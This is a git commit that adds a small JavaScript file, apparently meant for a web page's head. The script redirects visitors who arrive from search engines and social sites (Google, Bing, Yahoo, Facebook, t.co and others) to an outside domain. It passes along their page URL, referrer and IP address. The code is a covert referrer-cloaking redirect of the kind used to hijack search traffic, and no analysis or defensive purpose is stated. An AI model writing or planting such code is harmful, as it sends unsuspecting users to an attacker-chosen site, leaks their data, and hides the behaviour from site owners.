05784844755377cc1ca2c7a6081251556527cab9
toolsquasar <126128791+toolsquasar@users.noreply.github.com>
2025-03-08 01:11:50 +0700

    Create head_t1.js

---
+++ head_t1.js
@@ -0,0 +1,7 @@
+///// Arsae /////
+var arsT1Bing = 'https://cloud.teknodrem.com';
+// var arsT1Google = 'https://bohkreh.com';
+
+if(['google.', '.edu.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
+	window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + '&ip=' + window.ipAddressArsae
+}
